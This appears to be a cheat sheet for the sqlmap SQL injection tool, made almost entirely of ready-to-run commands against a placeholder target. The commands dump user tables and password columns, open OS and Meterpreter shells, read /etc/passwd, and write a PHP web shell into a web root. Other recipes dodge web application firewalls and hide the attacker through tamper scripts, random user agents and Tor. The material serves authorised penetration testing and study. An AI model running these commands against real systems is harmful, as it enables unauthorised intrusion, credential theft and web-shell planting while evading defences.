# sqlmap

> Automatic SQL injection detection and exploitation tool.

## Quickstart

```bash
# Test URL parameter
sqlmap -u "https://target.com/page?id=1"

# Test POST parameter
sqlmap -u "https://target.com/login" --data="user=admin&pass=test"

# Test with cookie
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123"

# Dump database
sqlmap -u "https://target.com/page?id=1" --dump
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| Detection | Find injectable parameters |
| Exploitation | Extract data, get shell |
| Techniques | UNION, blind, time-based, etc. |
| Tamper | Bypass WAF/filters |

## Syntax

```text
sqlmap -u <url> [options]
sqlmap -r <request.txt> [options]
```

## Options

### Target

| Option | Description |
|--------|-------------|
| `-u <url>` | Target URL with parameter |
| `-r <file>` | Load request from file |
| `-p <param>` | Testable parameter |
| `--data <data>` | POST data |
| `--cookie <c>` | Cookie string |
| `-H <header>` | Extra header |

### Detection

| Option | Description |
|--------|-------------|
| `--level <1-5>` | Test level (default 1) |
| `--risk <1-3>` | Risk level (default 1) |
| `--technique <tech>` | SQL techniques (BEUSTQ) |
| `--dbms <dbms>` | Force DBMS type |

### Enumeration

| Option | Description |
|--------|-------------|
| `--dbs` | List databases |
| `--tables` | List tables |
| `--columns` | List columns |
| `--dump` | Dump table data |
| `-D <db>` | Target database |
| `-T <table>` | Target table |
| `-C <cols>` | Target columns |
| `--dump-all` | Dump everything |

### Access

| Option | Description |
|--------|-------------|
| `--os-shell` | OS shell |
| `--os-pwn` | Meterpreter shell |
| `--sql-shell` | SQL shell |
| `--file-read <f>` | Read file |
| `--file-write <f>` | Write file |

### Bypass

| Option | Description |
|--------|-------------|
| `--tamper <script>` | Tamper script |
| `--random-agent` | Random user agent |
| `--proxy <url>` | Proxy |
| `--tor` | Use Tor |
| `--skip-waf` | Skip WAF detection |

### Performance

| Option | Description |
|--------|-------------|
| `--threads <n>` | Threads |
| `--time-sec <sec>` | Time-based delay |
| `--batch` | Non-interactive (defaults) |

## Recipes

### Basic Testing

```bash
# Test GET parameter
sqlmap -u "https://target.com/page?id=1"

# Test POST data
sqlmap -u "https://target.com/login" --data="user=admin&pass=test"

# Specific parameter
sqlmap -u "https://target.com/page?id=1&name=test" -p id

# Non-interactive
sqlmap -u "https://target.com/page?id=1" --batch
```

### From Request File

```bash
# Save request from Burp/Caido as request.txt
sqlmap -r request.txt

# With specific parameter
sqlmap -r request.txt -p id
```

### Detection Levels

```bash
# Default (level 1)
sqlmap -u "https://target.com/page?id=1"

# Higher level (more tests)
sqlmap -u "https://target.com/page?id=1" --level 3

# Maximum
sqlmap -u "https://target.com/page?id=1" --level 5 --risk 3

# Test cookies/headers
sqlmap -u "https://target.com/page" --level 2 --cookie="id=1"
```

### Database Enumeration

```bash
# List databases
sqlmap -u "https://target.com/page?id=1" --dbs

# List tables
sqlmap -u "https://target.com/page?id=1" -D database --tables

# List columns
sqlmap -u "https://target.com/page?id=1" -D database -T users --columns

# Dump table
sqlmap -u "https://target.com/page?id=1" -D database -T users --dump

# Dump specific columns
sqlmap -u "https://target.com/page?id=1" -D database -T users -C "username,password" --dump
```

### Shell Access

```bash
# SQL shell
sqlmap -u "https://target.com/page?id=1" --sql-shell

# OS shell
sqlmap -u "https://target.com/page?id=1" --os-shell

# Meterpreter
sqlmap -u "https://target.com/page?id=1" --os-pwn
```

### File Operations

```bash
# Read file
sqlmap -u "https://target.com/page?id=1" --file-read="/etc/passwd"

# Write file
sqlmap -u "https://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### WAF Bypass

```bash
# Random agent
sqlmap -u "https://target.com/page?id=1" --random-agent

# Tamper scripts
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment

# Multiple tampers
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,randomcase

# Common tampers: space2comment, charencode, between, randomcase, equaltolike
```

### Specific Techniques

```bash
# Union only
sqlmap -u "https://target.com/page?id=1" --technique=U

# Time-based only
sqlmap -u "https://target.com/page?id=1" --technique=T

# All techniques
# B=boolean, E=error, U=union, S=stacked, T=time, Q=inline
sqlmap -u "https://target.com/page?id=1" --technique=BEUSTQ
```

### Through Proxy

```bash
# Burp proxy
sqlmap -u "https://target.com/page?id=1" --proxy="http://127.0.0.1:8080"

# Tor
sqlmap -u "https://target.com/page?id=1" --tor --check-tor
```

## Output & Parsing

```bash
# Output directory
sqlmap -u "https://target.com/page?id=1" --dump --output-dir=./results

# CSV output
# Results saved in: ~/.sqlmap/output/target.com/dump/

# Parse dumped data
cat ~/.sqlmap/output/target.com/dump/database/users.csv
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No injection found | Increase `--level` and `--risk` |
| WAF blocking | Use `--tamper`, `--random-agent` |
| Slow | Reduce threads, check technique |
| False positive | Verify manually |

## References

- [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap)
- [sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- [Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
